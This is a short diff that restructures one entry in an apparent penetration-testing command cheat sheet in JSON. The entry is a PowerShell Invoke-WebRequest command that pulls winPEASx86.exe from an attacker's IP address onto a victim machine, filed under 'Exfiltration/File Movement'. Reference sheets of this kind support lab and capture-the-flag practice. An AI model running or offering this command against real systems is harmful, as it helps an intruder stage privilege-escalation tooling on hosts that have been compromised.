@@ -81,9 +81,11 @@
     ],
 
     "file":
-    {
-        "command": "powershell -c \"Invoke-WebRequest http://10.13.22.171:80/winPEASx86.exe -OutFile winPEASx86.exe\"",
-        "section": "Exfiltration/File Movement",
-        "description": "Download file from attacker computer to victim computer with powershell on victim pc. This requires attacker computer to have file server - see hosting file server commands. The first part 'powershell -c' is to execute a powershell command/scriptblock from command line. "
-    }
+    [
+        {
+            "command": "powershell -c \"Invoke-WebRequest http://10.13.22.171:80/winPEASx86.exe -OutFile winPEASx86.exe\"",
+            "section": "Exfiltration/File Movement",
+            "description": "Download file from attacker computer to victim computer with powershell on victim pc. This requires attacker computer to have file server - see hosting file server commands. The first part 'powershell -c' is to execute a powershell command/scriptblock from command line. "
+        }      
+    ]
 }
